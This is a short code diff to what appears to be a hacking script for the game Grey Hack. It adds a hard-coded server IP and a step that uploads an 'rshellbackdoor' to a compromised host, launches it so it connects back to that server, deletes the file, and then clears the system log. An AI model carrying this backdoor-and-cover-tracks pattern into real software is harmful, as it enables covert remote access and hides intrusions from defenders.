@@ -14,6 +14,7 @@ if typeof(port) != "number" then exit("Invalid port: " + port)
 pathTemp = "/home/" + active_user + "/Downloads" // temporary place till moved to final desination
 pathLib = pathTemp + "/libs" // place where all the libs will be stored
 pathCracked = pathTemp + "/cracked" // bank and passwd save place
+rshellServer = "29.88.203.47"
 
 // FUNCTIONS
 GetPassword = function(userPass)
@@ -118,6 +119,13 @@ else
     libLocal.move(pathLib + "/" + metaLib.version, libFile.name)
   end for
 end if
+
+// install and connect rshell on remote
+printYellow("installing rshellbackdoor ...\n")
+localShell.scp("/lib/metaxploit.so", "/lib", remoteShell) // UPLOAD
+localShell.scp("/data/rshellbackdoor", "/root", remoteShell) // UPLOAD
+remoteShell.launch("/root/rshellbackdoor", rshellServer)
+remoteComputer.File("root/rshellbackdoor").delete
 
 // CLEANUP
 printYellow("cleanup /var/system.log ...\n")
